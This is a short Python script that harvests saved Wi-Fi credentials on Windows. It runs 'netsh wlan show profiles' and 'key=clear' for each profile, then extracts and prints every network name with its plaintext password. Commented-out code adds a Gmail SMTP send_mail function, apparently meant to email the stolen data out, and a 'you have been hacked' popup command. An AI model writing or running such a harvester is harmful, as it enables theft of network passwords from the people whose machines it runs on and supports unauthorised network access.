import smtplib
import subprocess
import re

#
#
# # command = "msg * you have been hacked"
# # subprocess.Popen(command, shell=True)
#
# # netsh
# # netsh wlan show
# # netsh wlan show profiles
# # netsh wlan show profiles ssid key=clear
#
# def send_mail(email, password, message):
#     server = smtplib.SMTP("smtp.gmail.com", port=587)
#     server.starttls()
#     server.login(email, password)
#     server.sendmail(email, email, message)
#     server.quit()
#
#
command = "netsh wlan show profiles"
networks = subprocess.check_output(command, shell=True)
# print(networks.decode('ascii'))
data = re.findall('(?:Profile\\s*:\\s)(.*)', networks.decode('ascii'))
ssid_pass = []
for row in data:
        command_show = command + f' "{row}" key=clear'
        subcommand = subprocess.check_output(command_show, shell=True).decode('ascii')
        password =re.findall(r"(?:Content\s*:\s)(.*)(?:\r\n)", subcommand)
        ssid_pass.append(f"SSID:{row}\nPassword:{password.pop()}")
        # print(re.match(r'dh52112\d{3}$', "dh52112128"))
for ssid in ssid_pass:
    print(ssid)